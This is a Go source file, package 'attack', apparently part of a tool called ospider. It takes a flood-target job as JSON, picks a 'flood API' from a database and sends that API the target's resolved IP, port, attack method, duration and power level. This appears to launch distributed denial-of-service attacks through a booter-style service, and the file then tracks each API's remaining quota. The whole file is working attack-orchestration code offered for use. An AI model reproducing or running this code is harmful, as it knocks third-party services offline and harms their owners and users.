package attack

import (
	"github.com/huzorro/ospider/common"
	"github.com/huzorro/ospider/web/handler" 
    "github.com/huzorro/ospider/util"
	"encoding/json"
    "sync"
    "net/url"
    "fmt"
    "github.com/PuerkitoBio/goquery"
    "net"
)

type AttackSubmit struct {
    lock *sync.Mutex
    cfg common.Ospider                
}
func NewAttackSubmit(co common.Ospider) *AttackSubmit {
    return &AttackSubmit{cfg:co, lock:new(sync.Mutex)}
}

func (self *AttackSubmit) Process(payload string) {
    var (
        attack handler.FloodTarget
        api handler.FloodApi
    )
    if err := json.Unmarshal([]byte(payload), &attack); err != nil {
        self.cfg.Log.Printf("json Unmarshal fails %s", err)
        return
    }
    self.lock.Lock()
    defer self.lock.Unlock()
    // sqlStr := `select id, name, api, powerlevel, time 
    //             from spider_flood_api where uptime < unix_timestamp()  
    //             and time > 0 and powerlevel > 0 and status = 1`
    sqlStr := `select id, name, api, powerlevel, time 
                from spider_flood_api where uptime < unix_timestamp()  
                and status = 1`                
    stmtOut, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtOut.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        return
    }  
    
	err = stmtOut.QueryRow().Scan(&api.Id, &api.Name, &api.Api, &api.Powerlevel, &api.Time)
    if err != nil {
        self.cfg.Log.Println("not found available api")
        return
    }
    //attack submit
    url, _ :=  url.ParseRequestURI(api.Api)
    query := url.Query()
    ips, err := net.LookupIP(attack.Url)
    if  err == nil {
        attack.Host = ips[0].String()
    }
    query.Add("host", attack.Host)
    query.Add("method", attack.Method)
    query.Add("time", fmt.Sprintf("%d", attack.Time))
    query.Add("port", attack.Port)
    query.Add("powerlevel", fmt.Sprintf("%d", attack.Powerlevel))
    url.RawQuery = query.Encode()
    
    self.cfg.Log.Println(url.String()) 
    response, err := util.HttpGet(url.String())
    defer response.Body.Close()
    if err != nil {
        self.cfg.Log.Printf("request fails {%s}", url.String())
        return        
    }
    
    doc, _ := goquery.NewDocumentFromResponse(response)
    
    self.cfg.Log.Printf("{%s} {%s}", url.String(), doc.Text())
    
    sqlStr = `update spider_flood_api set time = time - ?, powerlevel = powerlevel - ? , uptime = unix_timestamp() + ? where id = ?`
    
    stmtIn, err := self.cfg.Db.Prepare(sqlStr)
    defer stmtIn.Close()
    if err != nil {
        self.cfg.Log.Printf("db.Prepare(%s) fails %s", sqlStr, err)
        return
    }  
    _, err = stmtIn.Exec(attack.Time, attack.Powerlevel, attack.Time, api.Id)
    
    if err != nil {
        self.cfg.Log.Printf("update flood api fails %s", err)
        return
    } 
                     
}
